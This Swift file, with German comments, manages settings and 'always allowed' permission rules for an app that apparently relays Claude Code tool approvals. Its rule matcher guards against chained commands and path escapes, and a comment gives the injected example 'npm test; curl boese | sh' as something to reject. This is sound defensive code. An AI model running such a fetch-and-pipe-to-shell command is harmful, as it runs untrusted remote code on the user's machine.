import Foundation

/// Die Einstellungen des Agenten-Motors: Freigaben, Meldungen, Kontingent.
///
/// Ob die Funktion insgesamt laeuft, steht bei den anderen Funktionen in
/// `Einstellungen` (`Funktion.agenten`). Hier steht nur, wie sie sich benimmt.
@MainActor
final class AgentenOptionen: ObservableObject {
    static let shared = AgentenOptionen()
    private let defaults = UserDefaults.standard

    private init() {
        defaults.register(defaults: [
            "agenten.freigabenInInsel": true,
            "agenten.freigabeFrist": 180.0,
            "agenten.mitteilungen": true,
            "agenten.beiFreigabeAufklappen": true,
            "agenten.beiFertigAufklappen": true,
            "agenten.aufklappDauer": 4.0,
            "agenten.kontingentZeigen": true,
            "agenten.immerErlaubt": [String]()
        ])
    }

    /// Aus: Claude fragt wie gewohnt nur im Terminal.
    var freigabenInInsel: Bool {
        get { defaults.bool(forKey: "agenten.freigabenInInsel") }
        set { defaults.set(newValue, forKey: "agenten.freigabenInInsel"); objectWillChange.send() }
    }

    /// Nach dieser Zeit ohne Antwort geht die Frage ans Terminal zurueck.
    /// 0 heisst ohne Frist.
    var freigabeFrist: Double {
        get { defaults.double(forKey: "agenten.freigabeFrist") }
        set { defaults.set(newValue, forKey: "agenten.freigabeFrist"); objectWillChange.send() }
    }

    var mitteilungen: Bool {
        get { defaults.bool(forKey: "agenten.mitteilungen") }
        set { defaults.set(newValue, forKey: "agenten.mitteilungen"); objectWillChange.send() }
    }

    var beiFreigabeAufklappen: Bool {
        get { defaults.bool(forKey: "agenten.beiFreigabeAufklappen") }
        set { defaults.set(newValue, forKey: "agenten.beiFreigabeAufklappen"); objectWillChange.send() }
    }

    /// Die Insel kurz aufklappen, wenn etwas fertig ist oder abbricht. Ohne das
    /// bleibt als Signal ein Punkt von der Groesse eines Reiskorns.
    var beiFertigAufklappen: Bool {
        get { defaults.bool(forKey: "agenten.beiFertigAufklappen") }
        set { defaults.set(newValue, forKey: "agenten.beiFertigAufklappen"); objectWillChange.send() }
    }

    var aufklappDauer: Double {
        get { defaults.double(forKey: "agenten.aufklappDauer") }
        set { defaults.set(newValue, forKey: "agenten.aufklappDauer"); objectWillChange.send() }
    }

    /// Kontingent in der Statuszeile von Claude Code und als Warnung in der
    /// Insel. Die Zahlen holt Saphir auch bei „aus", es druckt nur nichts.
    var kontingentZeigen: Bool {
        get { defaults.bool(forKey: "agenten.kontingentZeigen") }
        set { defaults.set(newValue, forKey: "agenten.kontingentZeigen"); objectWillChange.send() }
    }

    /// Ob der Nutzer Saphir mit Claude Code verbunden hat. Erst dann traegt die
    /// App beim Start ihre Hooks ein; vorher fasst sie `~/.claude` nicht an.
    var verbunden: Bool {
        get { defaults.bool(forKey: "agenten.verbunden") }
        set { defaults.set(newValue, forKey: "agenten.verbunden"); objectWillChange.send() }
    }

    // MARK: - Immer erlaubt

    var immerErlaubt: [String] {
        get { defaults.stringArray(forKey: "agenten.immerErlaubt") ?? [] }
        set { defaults.set(newValue, forKey: "agenten.immerErlaubt"); objectWillChange.send() }
    }

    func merkeImmerErlaubt(_ regel: String) {
        var regeln = immerErlaubt
        guard !regeln.contains(regel) else { return }
        regeln.append(regel)
        immerErlaubt = regeln
        Protokoll.info("Regel gemerkt: \(regel)")
    }

    func vergissImmerErlaubt(_ regel: String) {
        immerErlaubt = immerErlaubt.filter { $0 != regel }
    }

    /// Deckt eine gemerkte Regel diesen Aufruf schon ab?
    func istSchonErlaubt(werkzeug: String, eingabe: [String: JSONValue]) -> Bool {
        immerErlaubt.contains { Self.regel($0, trifft: werkzeug, eingabe: eingabe) }
    }

    /// Die Regeln sehen aus wie Claudes eigene Berechtigungsmuster:
    /// `Bash`, `Bash(npm test:*)`, `Edit(/Users/ich/projekt/**)`.
    ///
    /// Strenger als ein reiner Praefixvergleich, denn eine Regel gilt ohne
    /// Rueckfrage: `Bash(npm test:*)` darf `npm test` und `npm test --watch`
    /// durchlassen, aber nicht `npm testen` und nicht `npm test; curl boese | sh`.
    /// Ein Befehl, der etwas anhaengt, ist nicht mehr der, den man erlaubt hat.
    /// Im Zweifel fragt Saphir noch einmal.
    nonisolated static func regel(_ regel: String, trifft werkzeug: String,
                                  eingabe: [String: JSONValue]) -> Bool {
        guard let klammer = regel.firstIndex(of: "(") else {
            return regel == werkzeug
        }
        let regelWerkzeug = String(regel[regel.startIndex..<klammer])
        guard regelWerkzeug == werkzeug, regel.hasSuffix(")") else { return false }
        let innen = String(regel[regel.index(after: klammer)..<regel.index(before: regel.endIndex)])

        switch werkzeug {
        case "Bash":
            guard let befehl = eingabe["command"]?.stringValue else { return false }
            let vorsatz = innen.hasSuffix(":*") ? String(innen.dropLast(2)) : innen
            guard !vorsatz.isEmpty,
                  befehl == vorsatz || befehl.hasPrefix(vorsatz + " ") else { return false }
            return !verkettet(befehl)
        default:
            guard let roh = eingabe["file_path"]?.stringValue ?? eingabe["url"]?.stringValue else {
                return false
            }
            // `..` darf nicht aus dem erlaubten Ordner hinausfuehren.
            let pfad = roh.hasPrefix("/") ? (roh as NSString).standardizingPath : roh
            if innen.hasSuffix("/**") {
                let ordner = String(innen.dropLast(3))
                return pfad == ordner || pfad.hasPrefix(ordner + "/")
            }
            if innen.hasSuffix("*") { return pfad.hasPrefix(String(innen.dropLast())) }
            return pfad == innen
        }
    }

    /// Haengt der Befehl weitere Befehle an oder lenkt er etwas um?
    nonisolated static func verkettet(_ befehl: String) -> Bool {
        befehl.contains { "&|;`\n<>".contains($0) } || befehl.contains("$(")
    }
}
